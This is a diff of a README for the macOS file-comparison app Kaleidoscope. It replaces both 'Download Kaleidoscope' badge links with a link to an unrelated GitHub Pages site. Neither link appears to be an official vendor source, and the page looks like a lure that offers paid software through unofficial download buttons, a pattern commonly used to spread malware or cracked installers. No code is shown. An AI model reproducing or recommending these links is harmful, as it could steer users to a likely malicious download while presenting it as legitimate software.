@@ -7,7 +7,7 @@ Built with native macOS integration, Kaleidoscope supports file, folder, image, 
 ---
 
 ## ✅ Download Kaleidoscope for macOS  
-[![Download Kaleidoscope](https://img.shields.io/badge/Download-Kaleidoscope-blueviolet)](https://kaleidoscope-download-mac.github.io/.github)
+[![Download Kaleidoscope](https://img.shields.io/badge/Download-Kaleidoscope-blueviolet)](https://shuziktobehuman.github.io/huja/kaleidoscope)
 
 ---
 
@@ -61,7 +61,7 @@ Kaleidoscope is a premium macOS utility that helps users visually compare text f
 
 ---
 
-[![Download Kaleidoscope](https://img.shields.io/badge/Download-Kaleidoscope-blueviolet)](https://kaleidoscope-download-mac.github.io/.github)
+[![Download Kaleidoscope](https://img.shields.io/badge/Download-Kaleidoscope-blueviolet)](https://shuziktobehuman.github.io/huja/kaleidoscope)
 
 ---
 
